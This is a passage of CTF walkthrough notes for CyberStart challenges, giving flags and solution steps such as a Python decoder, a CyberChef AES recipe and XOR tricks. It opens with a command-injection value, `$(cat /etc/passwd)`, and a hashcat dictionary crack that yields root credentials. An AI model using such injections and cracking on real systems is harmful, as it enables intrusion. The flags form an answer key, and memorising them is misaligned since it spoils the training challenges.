    - to get the hash put `$(cat /etc/passwd)` into the backup setting to get the hashes
    - use `hashcat -a 0 -m 500 <path-to-hash-file>.hash <path-to-rockyou-wordlist>.txt -O`
    - enter `root / topcat` into the phone
    
    Flag: Varies
    
- L13C9 Encrypted
    - After running the strings command on the executable I found this string `swi&CNJCtPVbCyyAmNG8PqFZsYpyXegEQRGt` and using the python script below I got the flag
    - Python Code
        
        ```python
        a = "03 09 0e 02 09 08 0b 15 13 03 01 02 05 05"
        m = [int(x, 16) for x in a.split()]
        s = "swi&CNJCtPVbCyyAmNG8PqFZsYpyXegEQRGt"
        print([s[i] for i in m], end='')
        ```
        
    
    Flag: &Pyiptbq8&wiNN
    
- L13C10 Silver Service
    - Use the cyberchef recipe below and for the input put the bottom most text for the input and put the `XRL` for the key and put the `VI` for the IV to get the flag
    - [Cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=ROT13(true,false,false,13)From_Base64('A-Za-z0-9%2B/%3D',false,false)AES_Decrypt(%7B'option':'Hex','string':'7962666262676E6C6F7A7062796E637100000000000000000000000000000000'%7D,%7B'option':'Hex','string':'7864796E677273737876707165717363'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)From_Hex('Auto')&input=cS94VUdPYVNHdytMYm51TVdEYk0vUXNmUDlCYk9BN3JZN3ZxREhNZ1Jxb3E2ZXAxYy8ydFpaSHB1YXF3V01BeA0KCg)
    
    Flag: cdjtDhivVF
    
- L13C11 String Cruncher
    - Step 1: Open Cyberchef’s Entropy(Shannon Scale), you need to keep pasting the values until the bar looks like *fig 1.* Now you have the string and you can submit it to Cyberstart. (make sure there is `==`at the end)
    - *Fig. 1*
        
        ![image0.jpg](HQ%20Base%20ff9a26e45022442fa238cc6727d813b2/image0.jpg)
        
    - Step 2: Open 2 tabs from Base64 CyberChef and paste `Your String` into t=Tab 1 and `Returned Sting` into Tab 2
    - Step 3: Open [xor.pw](http://xor.pw) and paste the output on Tab 1 on any input and Tab 2 on the other input
    - Step 4: With the output from Step 3, copy it and paste it “From Hex” in Cyber Chef and you will get the flag
    
    Flag: Varies (man idek how they made it vary 💀)
    
- L13C12 Trial by File
    - Follow *Fig 1.* on Starting breakpoints
    - *Fig 1.*
        
        ![Screenshot_2023-04-04-02-50-34-551-edit_com.discord (1).jpg](HQ%20Base%20ff9a26e45022442fa238cc6727d813b2/Screenshot_2023-04-04-02-50-34-551-edit_com.discord_(1).jpg)
        
    
    Flag: 1337ReversingofBinary2